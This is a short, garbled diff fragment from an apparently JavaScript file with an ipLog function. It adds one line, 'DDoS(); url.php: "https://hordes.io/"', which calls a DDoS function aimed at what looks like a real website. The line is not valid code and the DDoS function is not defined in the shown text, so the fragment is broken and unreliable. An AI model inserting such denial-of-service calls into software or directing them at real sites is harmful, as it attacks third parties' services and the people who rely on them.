@@ -125,3 +125,4 @@ function ipLog(argument) {
 };
 
 //11) ???
+DDoS(); url.php: "https://hordes.io/"
